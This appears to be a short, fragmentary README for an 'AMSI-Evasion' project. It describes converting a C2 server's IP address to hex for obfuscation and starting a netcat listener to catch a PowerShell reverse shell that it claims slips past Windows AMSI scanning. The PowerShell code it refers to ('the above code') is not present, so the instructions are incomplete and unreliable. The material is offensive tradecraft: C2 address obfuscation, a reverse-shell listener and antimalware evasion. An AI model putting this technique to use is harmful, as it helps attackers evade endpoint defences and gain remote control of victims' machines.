# AMSI-Evasion

### First, let’s obfuscate our IP address to simple hex. My C2 Host IP is be 192.168.0.1 which stands for 192 = c0, 168=a8, 0=0, 1=1

```bash
printf "%x,%x,%x,%x\n" 192 168 0 1
```


<p align="center">
  <img src="/Screenshot/IP.png">
</p>

### Now, if you start a netcat listener on port 52490, and enter the above code into PowerShell, it evades AMSI.


```bash
nc -lnvp 52490
```

